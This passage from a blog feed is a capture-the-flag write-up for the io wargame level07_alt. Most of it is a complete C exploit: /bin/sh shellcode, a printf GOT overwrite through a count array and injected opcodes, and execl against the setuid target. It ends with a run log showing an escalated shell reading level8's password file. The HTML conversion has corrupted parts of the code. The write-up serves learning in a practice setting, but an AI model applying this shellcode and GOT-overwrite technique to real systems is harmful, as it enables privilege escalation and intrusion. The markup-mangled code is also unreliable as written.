<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">target</span> <span class="o">=</span> <span class="s">&quot;/levels/level07_alt&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">shellcode</span> <span class="o">=</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x31\xc0\xb0\x46\x31\xdb\x31\xc9</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xeb\x16\x5b\x31\xc0\x88</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x43\x07\x89\x5b\x08\x89\x43\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\xcd\x80\xe8\xe5\xff\xff\xff\x2f</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x62\x69\x6e\x2f\x73\x68\x58\x41</span><span class="s">&quot;</span>
</span><span class='line'><span class="s">&quot;</span><span class="se">\x41\x41\x41\x42\x42\x42\x42\x90</span><span class="s">&quot;</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// this is the address of the count array in memory</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">countAddress</span> <span class="o">=</span> <span class="mh">0x08049720</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// address of the printf GOT entry</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfAddress</span> <span class="o">=</span> <span class="mh">0x80496e8</span><span class="p">;</span>
</span><span class='line'><span class="c1">// initial value of the printf GOT entry</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfValue</span> <span class="o">=</span> <span class="mh">0x080482de</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// The index into the count array which stores the first</span>
</span><span class='line'><span class="c1">// instruction which will be executed when the program</span>
</span><span class='line'><span class="c1">// attempts to print out the results.</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">instructionStartIndex</span> <span class="o">=</span> <span class="mh">0x34</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// there are all the opcodes we need to write to</span>
</span><span class='line'><span class="c1">// the count array (in little-endian order)</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEaxEcx</span> <span class="o">=</span> <span class="mh">0xC889</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">incIncEcx</span> <span class="o">=</span> <span class="mh">0x4141</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">movEcxEcx</span> <span class="o">=</span> <span class="mh">0x98B</span><span class="p">;</span>
</span><span class='line'><span class="k">static</span> <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">jmpEcx</span> <span class="o">=</span> <span class="mh">0x21FF</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// Helper function which gives us the index into the count</span>
</span><span class='line'><span class="c1">// array that we would need in order to write a value to the</span>
</span><span class='line'><span class="c1">// given targetAddress.</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">getIndex</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">targetAddress</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">countAddress</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">return</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="p">(</span><span class="n">countAddress</span> <span class="o">-</span> <span class="n">targetAddress</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="p">(</span><span class="n">targetAddress</span> <span class="o">-</span> <span class="n">countAddress</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c1">// Helper function which takes a buffer, a value, and a counter and will</span>
</span><span class='line'><span class="c1">// repeatedly write the value to the buffer until the appropriate number of</span>
</span><span class='line'><span class="c1">// writes has happened. It&#39;ll return a pointer to the memory location</span>
</span><span class='line'><span class="c1">// which immediately follows where it finished off.</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">repeat</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">destination</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">value</span><span class="p">,</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>  <span class="p">{</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;*</span><span class="n">destination</span><span class="o">++</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">destination</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">// calculate some offets and indexes</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">startInstructionAddress</span> <span class="o">=</span> <span class="n">instructionStartIndex</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">countAddress</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfIndex</span> <span class="o">=</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">printfAddress</span><span class="p">);</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">printfInc</span> <span class="o">=</span> <span class="n">startInstructionAddress</span> <span class="o">-</span> <span class="n">printfValue</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">argBufSize</span> <span class="o">=</span> <span class="n">printfInc</span> <span class="o">+</span> <span class="n">movEaxEcx</span> <span class="o">+</span> <span class="n">incIncEcx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">movEcxEcx</span> <span class="o">+</span> <span class="n">jmpEcx</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">cursor</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="c1">// allocate some memory for our command line arguments and null terminate it</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">argBuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">argBufSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">argBuf</span><span class="p">[</span><span class="n">argBufSize</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="c1">// start by writing data required to point the printf entry to our location</span>
</span><span class='line'>  <span class="c1">// in the count array that contains our instructions</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">argBuf</span><span class="p">,</span> <span class="n">printfIndex</span><span class="p">,</span> <span class="n">printfInc</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// then write all our opcodes</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span><span class="p">,</span> <span class="n">movEaxEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="n">incIncEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">cursor</span> <span class="o">=</span> <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">3</span><span class="p">,</span> <span class="n">movEcxEcx</span><span class="p">);</span>
</span><span class='line'>  <span class="n">repeat</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">instructionStartIndex</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="n">jmpEcx</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Attempting to exploit, good luck!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">// finally invoke the program, passing in the shell code and</span>
</span><span class='line'>  <span class="c1">// making sure that EAX contains 8 at the right time.</span>
</span><span class='line'>  <span class="n">execl</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\x08</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argBuf</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="mi">0</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">free</span><span class="p">(</span><span class="n">argBuf</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Upload, compile and run the exploit and this is what happens:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Exploit Run  </span></figcaption>
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level7@io:/tmp/.oj<span class="nv">$ </span>./sploit
</span><span class='line'>Attempting to exploit, good luck!
</span><span class='line'>sh-4.2<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1008<span class="o">(</span>level8<span class="o">)</span>,1007<span class="o">(</span>level7<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
</span><span class='line'>sh-4.2<span class="nv">$ </span>cat /home/level8/.pass
</span><span class='line'>&amp;lt;&amp;lt; -- password was printed here -- &gt;&gt;
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Game over! What a great challenge that was.</p>

<p>I'd like to point out that this alternate level took me a <em>very long time</em> to nail. It was well worth the effort, and I learned a stack in the process.</p>

<p>Feedback is appreciated as always. Thanks for reading.</p>
]]></content>
  </entry>
  
</feed>
